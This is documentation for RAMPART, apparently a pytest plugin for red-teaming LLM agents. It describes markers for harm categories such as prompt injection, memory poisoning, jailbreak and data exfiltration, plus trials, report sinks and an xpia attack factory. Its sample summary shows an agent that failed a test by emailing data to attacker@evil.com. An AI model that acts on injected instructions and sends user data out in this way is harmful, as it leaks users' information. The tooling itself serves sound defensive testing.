# pytest Integration

RAMPART is a pytest plugin. It activates automatically when installed — no registration needed.

---

## Markers

### `@pytest.mark.harm(*categories)`

Categorize a test by the type of safety concern it covers. Accepts [`HarmCategory`][rampart.core.result.HarmCategory] enum values or plain strings.

**Why use it:** Harm markers group your tests by risk type. The terminal summary and JSON reports aggregate pass/fail statistics per category, so you can answer questions like "how many of our data exfiltration tests are passing?" at a glance. This is especially useful as your test suite grows — instead of scanning a flat list of test names, you see a structured breakdown by the type of harm you're testing for.

```python
from rampart import HarmCategory

@pytest.mark.harm(HarmCategory.DATA_EXFILTRATION)
async def test_email_exfil(adapter):
    ...

# Custom category (any string works — HarmCategory is a StrEnum)
@pytest.mark.harm("custom_product_risk")
async def test_custom_risk(adapter):
    ...
```

Built-in categories:

| Category | Value |
|----------|-------|
| `MEMORY_POISONING` | `"memory_poisoning"` |
| `PROMPT_INJECTION` | `"prompt_injection"` |
| `JAILBREAK` | `"jailbreak"` |
| `DATA_EXFILTRATION` | `"data_exfiltration"` |
| `OVER_PERMISSIVE_ACTION` | `"over_permissive_action"` |
| `DATA_LEAKAGE` | `"data_leakage"` |
| `CONTENT_SAFETY` | `"content_safety"` |
| `HALLUCINATION` | `"hallucination"` |
| `BEHAVIORAL_REGRESSION` | `"behavioral_regression"` |

### `@pytest.mark.trial(n=, threshold=)`

Declare the intended population size and correctness threshold for a test. The marker remains selectable with `pytest -m trial`, but does not repeat or clone the test.

**Why use it:** LLM-based agents are non-deterministic — the same prompt can produce different behavior across runs. A single test execution may not be representative. Trials address this by running the same test `n` times independently and reporting aggregate statistics. The `threshold` parameter lets you set an acceptable pass rate, acknowledging that 100% consistency may be unrealistic while still catching regressions. For example, `threshold=0.8` means "this test should pass at least 80% of the time" — if your agent suddenly drops below that, something changed.

```python
from rampart import Probes, execute_trials_async

@pytest.mark.trial(n=10, threshold=0.8)
async def test_with_threshold(adapter, trial_config):
    population = await execute_trials_async(
        execution_factory=lambda: Probes.behavior(...),
        adapter=adapter,
        n=trial_config.n,
        threshold=trial_config.threshold,
    )
    assert population, population.summary
```

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `n` | `int` | `1` | Intended number of executions |
| `threshold` | `float` | `1.0` | Minimum fraction of trials that must be SAFE to pass |

Use `--rampart-trials=N` to override only `trial_config.n`. The threshold remains the test's declared correctness bar. Class-level markers are inherited; a method-level marker shadows the class marker completely.

---

## Fixtures

### `trial_config`

Available to tests marked with `@pytest.mark.trial`. It returns an immutable [`TrialConfig`][rampart.pytest_plugin.TrialConfig] containing the effective `n` and declared `threshold`. Requesting it from an unmarked test is an error.

```python
from rampart.pytest_plugin import TrialConfig

@pytest.mark.trial(n=5, threshold=0.8)
def test_population(trial_config: TrialConfig):
    assert trial_config.n == 5
    assert trial_config.threshold == 0.8
```

---

## Registering Sinks

### `pytest_rampart_sinks` hook

Implement the `pytest_rampart_sinks` hook in your `conftest.py` to register the
report sinks RAMPART emits to. It behaves identically in single-process and
`pytest-xdist` runs:

```python
# conftest.py
from pathlib import Path

from rampart.reporting import JsonFileReportSink


def pytest_rampart_sinks(config):
    return [JsonFileReportSink(output_dir=Path(".report"))]
```

The hook receives the active `pytest.Config`, so you can build
sinks from CLI/ini options or environment variables. Multiple implementations are
supported; RAMPART emits to the **union** of every returned sink.

If you don't register any sinks, RAMPART still prints the terminal summary — but
no structured report files are written.

---

## Automatic Result Collection

When you call `Attacks.xpia(...).execute_async(adapter=...)` or `Probes.behavior(...).execute_async(adapter=...)` inside a test, RAMPART automatically collects the [`Result`][rampart.core.result.Result]. No manual wiring needed.

This works via [`ExecutionEventHandler`][rampart.core.execution.ExecutionEventHandler] instances the plugin installs on every [`BaseExecution`][rampart.core.execution.BaseExecution] at construction time.

### Manual Recording

For tests that construct [`Result`][rampart.core.result.Result] objects directly (without factories):

```python
from rampart import ObservabilityLevel, Result, SafetyStatus, record_result

async def test_manual_result():
    result = Result(
        status=SafetyStatus.SAFE,
        summary="Agent passed manual check",
        observability_level=ObservabilityLevel.RESPONSE_ONLY,
    )
    record_result(result)
```

`observability_level` is required. State what the adapter behind the check could
actually see, so the report never claims a level the run did not have. Where an
adapter is in scope, pass `adapter.observability_profile` rather than naming a
level by hand.

---

## Terminal Summary

After standard pytest output, RAMPART prints a safety summary grouped by harm category:

```
========================= RAMPART Safety Summary =========================

DATA_EXFILTRATION (4 results)
    FAIL  test_xpia_email_exfil -- Attack objective detected: send_email({'recipient': 'attacker@evil.com'}) (tool_only)
    PASS  test_xpia_email_exfil -- Agent defended successfully (tool_only)
    PASS  test_xpia_search_exfil -- Agent defended successfully (tool_only)
    PASS  test_xpia_search_exfil -- Agent defended successfully (tool_only)

MEMORY_POISONING (1 tests)
  PASS  test_memory_poison -- Agent defended successfully (tool_only)

Population: 5 runs - 1 unsafe (20.0% attack success rate), 0 undetermined, 0 errors
==========================================================================
```

Each result line shows:

- **`PASS`/`FAIL`/`WARN`/`ERR`** — the safety verdict
- **Test name** — the pytest test that recorded the result
- **Summary** — e.g., `Agent defended successfully` or `Attack objective detected: ...`
- **Observability level** — `tool_only`, `tool_and_side_effects`, or `response_only`

The **Population** line shows totals across all tests in the session, with the attack success rate excluding `ERROR` results from the denominator.


